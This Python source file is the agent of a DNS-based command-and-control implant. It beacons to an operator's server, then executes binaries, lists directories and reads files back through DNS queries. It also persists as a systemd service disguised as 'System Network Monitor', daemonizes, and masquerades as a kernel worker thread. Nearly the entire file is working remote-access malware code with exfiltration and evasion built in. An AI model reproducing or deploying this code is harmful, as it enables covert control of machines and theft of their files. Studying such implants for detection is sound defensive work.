#!/usr/bin/env python3

# *********************************************************
#
# Description: Main execution framework and signaling endpoint loop for agent.
# Usage: sudo .venv/bin/python3 client/agent_beacon.py -i <interface> -d <server_ip>
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

import argparse
import asyncio
import logging
import os
import subprocess
import shlex
import sys
import time
from typing import Final
import scapy.all as scapy

try:
    from setproctitle import setproctitle
except ImportError:
    def setproctitle(title: str) -> None:  # type: ignore[misc]
        pass

import agent_session
from common import cnc_core, cnc_crypto

# --- Constants & State ---

HEARTBEAT_SLEEP_TICK: Final[float] = 0.1
SUBPROCESS_TIMEOUT_LIMIT: Final[int] = 10

_SYSTEMD_UNIT = """\
[Unit]
Description=System Network Monitor
After=network.target

[Service]
Type=simple
ExecStart={python} {script} {agent_args}
Restart=on-failure
RestartSec=30
StandardOutput=append:/var/log/cnc-agent.log
StandardError=append:/var/log/cnc-agent.log

[Install]
WantedBy=multi-user.target
"""

# ==============================================================================

# --- Functions ---

# ==============================================================================


def parse_cli_arguments() -> argparse.Namespace:
    """Parse and return validated CLI arguments for the agent beacon."""
    parser = argparse.ArgumentParser(
        description="DNS C2 client agent."
    )
    parser.add_argument(
        "-i", "--interface", type=str, required=True,
        help="Network interface",
    )
    parser.add_argument(
        "-d", "--server-ip", type=cnc_core.validate_ipv4,
        required=True, help="C2 server IPv4 address",
    )
    parser.add_argument(
        "--domain", type=str, default="q.c2",
        help="C2 DNS domain suffix (default: q.c2)",
    )
    parser.add_argument(
        "--port", type=int, default=53,
        help="Server UDP port (default: 53)",
    )
    parser.add_argument(
        "--heartbeat", type=float, default=10.0,
        help="Median beacon interval in seconds (default: 10.0)",
    )
    parser.add_argument(
        "--max-qname", type=int, default=120,
        help="Max FQDN length in DNS queries (default: 120; range 64–253)",
    )
    parser.add_argument(
        "--simulate-drop", action="store_true",
        help="Drop 15%% of ACKs (ARQ stress test)",
    )
    parser.add_argument(
        "--daemon", action="store_true",
        help="Detach from terminal and run as a background daemon",
    )
    parser.add_argument(
        "--log", type=str, default="/dev/null",
        help="Log file path when running as daemon (default: /dev/null)",
    )
    parser.add_argument(
        "--install-service", action="store_true",
        help="Install systemd persistence service and exit (needs root)",
    )
    return parser.parse_args()


# ==============================================================================


def _handle_list_dir(data_str: str) -> bytes:
    """List a directory on the agent and return the result."""
    try:
        target_path = data_str if data_str else "."
        if not os.path.isabs(target_path) and target_path != ".":
            return b"[Protocol Error] Provided path is not absolute."
        if not os.path.exists(target_path):
            return b"[Protocol Error] Directory does not exist."
        files_list = os.listdir(target_path)
        return (
            "\n".join(files_list).encode('utf-8') if files_list else b"."
        )
    except Exception as e:
        return f"[Protocol Error] Folder isolation anomaly: {e}".encode()


# ==============================================================================


def _handle_run_file(data_str: str) -> bytes:
    """Execute a binary on the agent and return its output."""
    try:
        cmd_args = shlex.split(data_str)
        if not cmd_args:
            return b"[Protocol Error] Empty command."
        if not os.path.isabs(cmd_args[0]):
            return b"[Protocol Error] Executable path must be absolute."
        if not os.path.exists(cmd_args[0]):
            return b"[Protocol Error] Executable not found."
        result = subprocess.run(
            cmd_args, shell=False, capture_output=True, text=True,
            timeout=SUBPROCESS_TIMEOUT_LIMIT,
        )
        output = result.stdout if result.stdout else result.stderr
        return output.strip().encode('utf-8') if output else b"SUCCESS"
    except subprocess.TimeoutExpired:
        return b"[Protocol Error] Execution duration breached timeout."
    except Exception as e:
        return f"[Protocol Error] Native launch anomaly: {e}".encode()


# ==============================================================================


def _handle_file_transfer(data_str: str) -> bytes:
    """Read a file on the agent and return its contents."""
    try:
        if not os.path.isabs(data_str):
            return b"[Protocol Error] File path is not absolute."
        if not os.path.exists(data_str):
            return b"[Protocol Error] File does not exist on client."
        header = f"[File Content Outbox] Source: {data_str}\n---\n"
        header_size = len(header.encode('utf-8'))
        file_size = os.path.getsize(data_str)
        if file_size + header_size > cnc_core.MAX_BUFFER_LIMIT:
            return (
                f"[Protocol Error] File too large ({file_size} bytes); "
                f"limit is {cnc_core.MAX_BUFFER_LIMIT - header_size} bytes."
            ).encode()
        with open(data_str, "rb") as fh:
            return header.encode('utf-8') + fh.read()
    except Exception as e:
        return f"[Protocol Error] Disk read failures: {e}".encode()


# ==============================================================================


def handle_protocol_instruction(
    app_opcode: int, data_payload_bytes: bytes
) -> bytes:
    """Dispatch an operator command to the appropriate handler."""
    data_str = data_payload_bytes.decode('utf-8', errors='ignore').strip()
    if app_opcode == cnc_core.CMD_KEEPALIVE:
        return b"Status: Synced with Server"
    if app_opcode == cnc_core.CMD_LIST_DIR:
        return _handle_list_dir(data_str)
    if app_opcode == cnc_core.CMD_RUN_FILE:
        return _handle_run_file(data_str)
    if app_opcode == cnc_core.CMD_FILE_TRANSFER:
        return _handle_file_transfer(data_str)
    return b"[Protocol Error] Unrecognized instruction signature."


# ==============================================================================


def daemonize(log_path: str) -> None:
    """Double-fork to detach from the terminal and redirect I/O."""
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    os.umask(0o022)
    if os.fork() > 0:
        sys.exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    devnull = os.open("/dev/null", os.O_RDONLY)
    os.dup2(devnull, sys.stdin.fileno())
    os.close(devnull)
    logfd = os.open(log_path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    os.dup2(logfd, sys.stdout.fileno())
    os.dup2(logfd, sys.stderr.fileno())
    os.close(logfd)
    logging.basicConfig(
        stream=sys.stderr, level=logging.INFO,
        format="%(asctime)s %(message)s",
    )


# ==============================================================================


def install_systemd_service(args: argparse.Namespace) -> None:
    """Write a systemd unit for the agent and exit."""
    parts = [
        f"-i {args.interface}",
        f"-d {args.server_ip}",
        f"--domain {args.domain}",
        f"--port {args.port}",
    ]
    if args.simulate_drop:
        parts.append("--simulate-drop")
    if args.max_qname != 120:
        parts.append(f"--max-qname {args.max_qname}")
    unit_content = _SYSTEMD_UNIT.format(
        python=sys.executable,
        script=os.path.abspath(__file__),
        agent_args=" ".join(parts),
    )
    unit_path = "/etc/systemd/system/network-monitor.service"
    try:
        with open(unit_path, "w") as fh:
            fh.write(unit_content)
        os.chmod(unit_path, 0o644)
        print(f"[+] Service installed at {unit_path}")
        print("[+] Enable with: systemctl enable --now network-monitor")
    except PermissionError:
        print("[!] Permission denied. Run with sudo.", file=sys.stderr)
        sys.exit(1)


# ==============================================================================


async def client_heartbeat_loop(args: argparse.Namespace) -> None:
    """Send periodic keep-alive beacons to the server."""
    last_beacon_time: float = 0.0
    while not agent_session.should_agent_exit:
        actual_delay = cnc_core.get_heartbeat_interval()
        payload_bytes = b"Status: Alive / Awaiting Instructions"
        if (
            not agent_session.is_terminal_state_active() and
            not agent_session.tx_lock.locked()
        ):
            now = time.time()
            elapsed = now - last_beacon_time if last_beacon_time else 0.0
            ts = time.strftime("%H:%M:%S", time.localtime(now))
            if last_beacon_time:
                print(
                    f"[Beacon] {ts}  interval={elapsed:.2f}s"
                    f"  next≈{actual_delay:.2f}s"
                )
            else:
                print(
                    f"[Beacon] {ts}  first beacon"
                    f"  next≈{actual_delay:.2f}s"
                )
            last_beacon_time = now
            await agent_session.send_request_chunks_reliably(
                args, payload_bytes
            )
        for _ in range(int(actual_delay * 10)):
            if agent_session.should_agent_exit:
                return
            await asyncio.sleep(HEARTBEAT_SLEEP_TICK)


# ==============================================================================


async def main(args: argparse.Namespace) -> None:
    """Initialize transport, run handshake loop, and manage beacon tasks."""
    cnc_core.DNS_QNAME_TARGET_LEN = args.max_qname
    cnc_core.set_c2_domain(args.domain)
    cnc_core.DNS_PORT = args.port
    cnc_core.set_heartbeat_interval(args.heartbeat)
    agent_session.init_handshake_psk()
    agent_session.init_l3_socket(args.interface)
    inbound_queue: asyncio.Queue[bytes] = asyncio.Queue()
    master_loop = asyncio.get_running_loop()

    sniff_process = scapy.AsyncSniffer(
        iface=args.interface,
        filter=(
            f"inbound and udp and src port {args.port} "
            f"and src host {args.server_ip}"
        ),
        prn=lambda pkt: agent_session.process_raw_sniffer_packet(
            pkt, args, inbound_queue, master_loop
        ),
        store=False,
    )
    sniff_process.start()

    try:
        while not agent_session.should_agent_exit:
            agent_session.reset_session_state()
            dispatcher_task = asyncio.create_task(
                agent_session.reactive_client_dispatcher(
                    inbound_queue, args, handle_protocol_instruction
                )
            )

            print("[Client] Initiating ephemeral key exchange handshake...")
            if not await agent_session.perform_client_handshake(args):
                dispatcher_task.cancel()
                await asyncio.gather(
                    dispatcher_task, return_exceptions=True
                )
                if agent_session.should_agent_exit:
                    break
                print(
                    "[!] Handshake failed, retrying in 30s...",
                    file=sys.stderr,
                )
                await asyncio.sleep(30)
                continue

            print("[Client] Handshake verified! FS channel active.")
            heartbeat_task = asyncio.create_task(
                client_heartbeat_loop(args)
            )

            while (
                not agent_session.should_agent_exit and
                not agent_session.needs_reconnect()
            ):
                await asyncio.sleep(1.0)

            heartbeat_task.cancel()
            dispatcher_task.cancel()
            await asyncio.gather(
                heartbeat_task, dispatcher_task, return_exceptions=True
            )

            if (
                agent_session.needs_reconnect()
                and not agent_session.should_agent_exit
            ):
                print(
                    "[Client] Session lost, reconnecting in 10s...",
                    file=sys.stderr,
                )
                cnc_crypto.destroy_session_crypto()
                await asyncio.sleep(10)
    finally:
        sniff_process.stop()
        cnc_crypto.destroy_session_crypto()
        print("[Client] Connection released & keys destroyed from RAM.")


# ==============================================================================

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root (raw socket requires root).", file=sys.stderr)
        sys.exit(1)
    parsed_args = parse_cli_arguments()
    if parsed_args.install_service:
        install_systemd_service(parsed_args)
        sys.exit(0)
    if parsed_args.daemon:
        daemonize(parsed_args.log)
    setproctitle("[kworker/u2:0]")
    try:
        asyncio.run(main(parsed_args))
    except KeyboardInterrupt:
        print("\n[!] Client runtime terminated.")
        sys.exit(0)
